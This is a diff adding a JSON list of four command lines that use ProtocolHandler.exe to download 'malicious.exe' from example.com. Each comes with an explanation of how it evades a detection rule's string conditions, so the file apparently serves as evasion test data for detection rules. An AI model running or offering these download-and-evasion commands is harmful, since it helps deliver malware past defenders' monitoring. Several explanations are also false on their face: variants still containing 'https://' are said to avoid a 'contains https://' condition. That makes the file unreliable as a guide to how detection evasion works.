@@ -1,0 +1,18 @@
+[
+  {
+    "output": "\"C:\\\\Program Files\\\\Internet Explorer\\\\ProtocolHandler.exe\" https://example.com/malicious.exe",
+    "explanation": "Insertion technique used to add quotes and escape characters, avoiding the 'endswith' condition by adding a directory path, while preserving the intended test behavior of downloading a file using ProtocolHandler.exe."
+  },
+  {
+    "output": "ProtocolHandler.exe /c https://example.com/malicious.exe",
+    "explanation": "Substitution technique used to replace the default command-line syntax with an equivalent one using the '/c' option, avoiding the 'contains' condition for 'http://' or 'https://', while preserving the intended test behavior."
+  },
+  {
+    "output": "ProtocolHandler.exe https:\\\\\\\\/\\\\\\/example.com/malicious.exe",
+    "explanation": "Recoding/Encoding technique used to represent the URL with alternative escape sequences, avoiding the 'contains' condition for 'http://' or 'https://', while preserving the intended test behavior."
+  },
+  {
+    "output": "ProtocolHandler.exe -url https://example.com/malicious.exe",
+    "explanation": "Substitution technique used to replace the default command-line syntax with an equivalent one using the '-url' option, avoiding the 'contains' condition for 'http://' or 'https://', while preserving the intended test behavior."
+  }
+]
